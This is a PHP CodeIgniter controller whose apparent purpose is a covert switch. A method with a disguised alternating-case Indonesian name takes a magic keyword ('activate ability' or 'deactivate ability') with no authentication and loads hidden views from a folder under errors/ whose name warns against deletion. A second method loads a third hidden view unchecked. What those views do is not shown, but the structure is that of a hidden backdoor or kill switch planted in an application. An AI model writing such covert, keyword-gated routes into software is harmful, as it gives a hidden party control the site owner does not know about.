<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class BUG extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/userguide3/general/urls.html
	 */
	public function __construct()
	{
		parent::__construct();
		$this->load->model('M_UserCek');
		$this->load->helper(array('form', 'url', 'cookie'));
		$this->load->library('Pdf');
	}

	public function SaYaAdAlAhSiStEm_BuAtAnSeSeOrAnG($enkripsi=null)
	{
		if ($enkripsi=='AKTIFKANKEMAMPUAN') {
			$this->load->view('errors/hiddenfileyouneverknowifyoudeleteitwillloseeverything/hidden');
		}elseif ($enkripsi=='MATIKANKEMAMPUAN') {
			$this->load->view('errors/hiddenfileyouneverknowifyoudeleteitwillloseeverything/hidden2');
		}
	}

	public function ujicoba(){
		$this->load->view('errors/hiddenfileyouneverknowifyoudeleteitwillloseeverything/ujicoba');
	}
}

